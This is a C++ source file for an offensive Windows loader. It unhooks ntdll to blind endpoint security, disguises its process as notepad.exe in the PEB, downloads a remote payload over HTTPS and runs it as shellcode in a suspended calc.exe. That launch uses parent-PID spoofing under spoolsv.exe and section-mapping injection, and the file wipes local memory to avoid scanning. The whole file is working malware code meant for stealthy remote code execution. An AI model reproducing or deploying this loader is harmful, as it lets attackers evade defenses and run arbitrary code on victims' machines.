#include <Windows.h>
#include <iostream> 
#include <tlhelp32.h>
#include <tchar.h>
#include <vector>
#include <winhttp.h>
#include <psapi.h>
#include "Ven.h"

#pragma comment(lib, "winhttp.lib")




/**
*   Check if the first bytes of the ntdll function is hooked or not
*   All ntdll functions begins with \x4c\x8b\xd1\xb8
*   If these bytes are differents, the function is hooked
*   https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions
*/
BOOL isItHooked(LPVOID addr) {
    BYTE stub[] = "\x4c\x8b\xd1\xb8";
    std::string charData = (char*)addr;
    if (memcmp(addr, stub, 4) != 0) {
        return TRUE;
    }
    return FALSE;
}




/**
*   Check if common critical functions are hooked or not
*   If they are hooked, the function will map in memory
*   a copy of the ntdll.dll file to override our process'
*   ntdll text section with the mapped text section to
*   recover the original functions addresses 
*/
void unhook() {
    printf("[+] Detecting ntdll hooks\n");
    int nbHooks = 0;
    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
        nbHooks++;
    }
    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
        nbHooks++;
    }
    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
        nbHooks++;
    }
    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"))) {
        nbHooks++;
    }
    if (nbHooks > 0) {
        printf("[+] Unhooking ntdll from a fresh memory alloc\n");
        char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
        char sntdll[] = { '.','t','e','x','t',0 };
        HANDLE process = GetCurrentProcess();
        MODULEINFO mi = {};
        // our current process ntdll module
        HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
        GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
        LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
        // create a mapped copy of the ntdll.ddl file from disk
        HANDLE ntdllFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
        // for each section of our mapped copy, if it is the text section, then override our process ntdll text section module
        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll)) {
                DWORD oldProtection = 0;
                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
            }
        }
        // Redefine Nt functions
        printf("[+] Redefining Nt functions\n");
        HINSTANCE hNtdll = GetModuleHandleA("ntdll.dll");
        _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
        _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
        _NtQueryInformationThread NtQueryInformationThread = (_NtQueryInformationThread)GetProcAddress(hNtdll, "NtQueryInformationThread");
        printf("[+] Detecting hooks in new ntdll module\n");
        nbHooks = 0;
        if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
            nbHooks++;
        }
        if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
            nbHooks++;
        }
        if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
            nbHooks++;
        }
        if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"))) {
            nbHooks++;
        }
        if (nbHooks > 0) {
            printf("[!] Unhooking failed\n");
        }
        else {
            printf("[+] Unhooking works\n");
        }
    }
}












/**
*   Masquerade our current process commandline and imagepathname
*   by modifying the Process Environement Block (PEB)
*/
void hidePEB() {
    printf("[+] Masquerading process in PEB\n");
    HANDLE h = GetCurrentProcess();
    PROCESS_BASIC_INFORMATION ProcessInformation;
    ULONG lenght = 0;
    HINSTANCE ntdll;
    typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    MYPROC GetProcessInformation;
    wchar_t commandline[] = L"C:\\windows\\system32\\notepad.exe";
    ntdll = LoadLibrary(TEXT("Ntdll.dll"));
    GetProcessInformation = (MYPROC)GetProcAddress(ntdll, "NtQueryInformationProcess");
    //get _PEB object
    (GetProcessInformation)(h, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);
    //replace commandline and imagepathname
    ProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer = commandline;
    ProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = commandline;
}










/**
*   Download a raw payload from an external website
*/
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
    printf("[+] Downloading remote payload\n");
    HINTERNET hSession = WinHttpOpen(NULL,WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,WINHTTP_FLAG_SECURE_DEFAULTS);
    HINTERNET hConnect = WinHttpConnect(hSession,baseAddress,INTERNET_DEFAULT_HTTPS_PORT,0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,L"GET",filename,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
    WinHttpReceiveResponse(hRequest,NULL);
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;
    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return buffer;
}





/**
*   Check all running processes to find the PID of the spoolsv process
*/
DWORD GetPID() {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &processEntry)) {
            do {
                if (_tcsicmp(processEntry.szExeFile, _T("spoolsv.exe")) == 0) {
                    printf("[+] Retrieving spoolsv PID : %lu\n", processEntry.th32ProcessID);
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}










/**
*   Execute our raw payload by creating a suspended process (Process Hollowing)
*   with a custom thread attribute list to spoof its parent PID (PPID spoofing)
*   and creating a new section into our child process memory to copy our shellcode
*   and finally restore closing the delete-pending state to execute our payload
*/
void execution(std::vector<BYTE> sh, DWORD exPID) {
    printf("[+] Opening a handle on spoolsv process\n");
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, exPID);
    LPVOID ptr = &sh[0];
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
    printf("[+] Creating suspended process with PPID spoofing\n");
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\calc.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { sh.size() };
    NTSTATUS status = ntCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&szSection,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
    // map section into memory of our local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;
    status = ntMapViewOfSection(hSection,GetCurrentProcess(),&hLocalAddress,NULL,NULL,NULL,&viewSize,ViewShare,NULL,PAGE_EXECUTE_READWRITE);
    // copy shellcode into our local memory
    RtlCopyMemory(hLocalAddress, ptr, sh.size());
    // map section into memory of suspended child process
    PVOID hRemoteAddress = NULL;
    printf("[+] Adding new section with shellcode\n");
    status = ntMapViewOfSection(hSection,victimProcess,&hRemoteAddress,NULL,NULL,NULL,&viewSize,ViewShare,NULL,PAGE_EXECUTE_READWRITE);

    // wiping our current process memory to avoid memory scanning
    printf("[+] Cleaning local memory\n");
    memset(&sh, 0, sizeof(sh));
    memset(&hLocalAddress, 0, sizeof(hLocalAddress));

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    printf("[+] Creating new thread\n");
    GetThreadContext(threadHandle, pContext);
    // update rcx context to execute our payload
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(threadHandle, pContext);
    printf("[+] Resuming execution\n");
    ResumeThread(threadHandle);
    status = ntUnmapViewOfSection(victimProcess,hLocalAddress);
}

